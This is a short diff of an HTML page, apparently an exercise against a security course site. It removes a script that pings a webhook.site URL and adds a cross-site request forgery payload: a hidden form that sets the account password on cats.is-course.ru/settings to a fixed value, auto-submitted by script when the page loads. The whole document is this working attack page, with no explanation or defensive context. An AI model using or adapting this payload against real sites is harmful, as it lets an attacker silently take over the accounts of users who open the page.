@@ -1,5 +1,11 @@
 <html>
-  <script>
-    fetch('https://webhook.site/3d3d5e10-102d-4dca-b6f6-b29dfb064daa')
-  </script>
+    <body>
+        <form action="https://cats.is-course.ru/settings" method="POST">
+            <input type="hidden" name="password" value="Biba$123456789" />
+            <input type="hidden" name="confirm-password" value="Biba$123456789" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
 </html>
